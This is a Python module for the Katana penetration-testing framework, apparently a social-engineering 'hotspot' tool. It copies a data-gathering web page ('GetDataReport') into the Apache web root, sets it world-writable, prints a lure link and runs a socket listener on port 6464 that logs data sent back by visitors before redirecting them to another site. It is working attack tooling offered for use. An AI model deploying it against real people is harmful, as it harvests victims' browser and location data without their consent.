# This module requires katana framework 
# https://github.com/RedToor/Katana
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core.Setting import *    #
from core import Errors       #
from core import getFunction  #
import sys                    #
Message=DESIGN()              #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import socket                 #
import select                 #
from threading import Thread  #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

# INFORMATION MODULE
def initialize():
	initialize.Author             ="RedToor"
	initialize.Version            ="1.0"
	initialize.Despcription       ="Hotspoter web, assambly with GetDataReport Plugin."
	initialize.CodeName           ="set/hotspot"
	initialize.DateCreation       ="24/03/2016"      
	initialize.LastModification   ="24/03/2016"

	# DEFAULT VARIABLES             VALUE                NAME        RQ     DESCRIPTION
	initialize.DEFAULT_VARIABLE   =[["www.google.com" , "to_url"    ,"yes" , "Url redirect"]]        #[0][0]
	initialize.DEFAULT_VARIABLE  +=[["false"          , "geoloc"    ,"no"  , "Geolocation"]]         #[1][0]
initialize()
# END INFORMATION MODULE

# MAIN FUNCTION
def main(run):
	try:
		# HEAD MODULE
		if run:	actions=raw_input(Message.prompt(initialize.CodeName))
		else  : actions="run"
		if   getFunction.KatanaCheckActionShowOptions(actions):getFunction.ShowOptions(initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionSetValue(actions)   :initialize.DEFAULT_VARIABLE=getFunction.UpdateValue(actions,initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionisBack(actions)     :return
		# END HEAD MODULE
		elif getFunction.runModule(actions):
			Message.run()
			# CODE MODULE    ############################################################################################
			print " "+Alr+" Setting files",getFunction.status_cmd('mkdir -p '+PATCH_WWW+'r/ ; echo "<?php \$url=\'http://'+initialize.DEFAULT_VARIABLE[0][0]+'\';\$javascript=\''+initialize.DEFAULT_VARIABLE[1][0]+'\';?>" > '+PATCH_WWW+'r/appconfig.php & echo ',"\t\t\t\t")
			print " "+Alr+" Coping files to server",getFunction.status_cmd("cp files/getdatareport/* "+PATCH_WWW+"r/","\t\t\t")
			print " "+Alr+" Giving privileges to files",getFunction.status_cmd("chmod -R 777 "+PATCH_WWW+"r","\t\t")
			if True:
				try:
					print " "+Alr+" Starting Apache Server",getFunction.status_cmd("service apache2 start","\t\t\t")
					print " "+Alr+" Starting Script Server",getFunction.status_cmd("sudo fuser -kuv 6464/tcp > null","\t\t\t")
					Message.space()
					Message.go("Link HOT http://127.0.0.1/r/link.php?lKsm#s92Sa")
					print (" "+Hlp+" to stop the module press "+colors[13]+"[Ctrl+c]"+colors[0])
					server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					server.bind(("", 6464))
					server.listen(1)
					print " "+Suf+" Waiting bees..."
					while 1:
						socket_cliente, datos_cliente = server.accept()
						print " "+War+" beed: "+str(datos_cliente)
						hilo = Cliente(socket_cliente, datos_cliente)
						hilo.start()
					raw_input(" "+Hlp+" Press any key for Stop GetDataReport")
				except:
					Errors.Errors(event=sys.exc_info(), info=False)
				print ""
				print(" "+Alr+" Stoping Process")
				print " "+Alr+" Removing files",getFunction.status_cmd("rm "+PATCH_WWW+"r/link.php "+PATCH_WWW+"r/appconfig.php "+PATCH_WWW+"r/GetdataReport.Plugin.php","\t\t\t\t")
				print " "+Alr+" Stoping Apache",getFunction.status_cmd("service apache2 stop","\t\t\t\t")
				server.close()
				Message.space()
			# END CODE MODULE ############################################################################################
		else:
			getFunction.KatanaCheckActionGlobalCommands(actions)
	# ERROR GENERAL
	except:
		Errors.Errors(event=sys.exc_info(), info=sys.exc_traceback.tb_lineno)
	# END ERROR GENERAL
	main(True)
# END MAIN FUNCTION

# LINKER FUNCTION
def run(url,javascript):
	initialize.DEFAULT_VARIABLE [0][0] = url
	initialize.DEFAULT_VARIABLE [1][0] = javascript
	main(False)
# END LINKER FUNCTION

class Cliente(Thread):
    def __init__(self, socket_cliente, datos_cliente):
        Thread.__init__(self)
        self.socket = socket_cliente
        self.datos = datos_cliente
 
    def run(self):
    	peticion = self.socket.recv(1024)
    	print peticion
    	self.socket.close()